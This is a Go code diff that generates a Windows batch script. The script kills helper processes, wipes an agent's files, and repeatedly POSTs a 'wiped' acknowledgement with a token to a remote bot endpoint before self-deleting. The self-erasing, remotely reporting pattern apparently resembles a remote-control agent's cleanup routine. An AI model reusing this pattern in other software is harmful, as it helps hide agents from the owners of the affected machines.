@@ -603,8 +603,17 @@ try {
 		if tok != "" && bb != "" {
 			escTok := strings.ReplaceAll(tok, `"`, "")
 			escBB := strings.ReplaceAll(bb, `"`, "")
-			notifyLine = "curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1\r\n" +
-				"ping 127.0.0.1 -n 2 >nul\r\n"
+			// LAST BREATH: retry wiped ack until bot confirms — then self-delete.
+			// Never claim success from a Telegram timer.
+			notifyLine = "echo notifying bot...\r\n" +
+				"set ACK=0\r\n" +
+				"for /L %%i in (1,1,12) do (\r\n" +
+				"  if !ACK! EQU 0 (\r\n" +
+				"    curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1 && set ACK=1\r\n" +
+				"    if !ACK! EQU 0 ping 127.0.0.1 -n 4 >nul\r\n" +
+				"  )\r\n" +
+				")\r\n" +
+				"if !ACK! EQU 0 curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1\r\n"
 		}
 		dirEsc := strings.ReplaceAll(dir, `'`, `''`)
 		cacheEsc := strings.ReplaceAll(cacheDir, `'`, `''`)
@@ -615,6 +624,7 @@ try {
 		_ = os.WriteFile(psElev, []byte(elevBody), 0o644)
 
 		body := "@echo off\r\n" +
+			"setlocal EnableDelayedExpansion\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
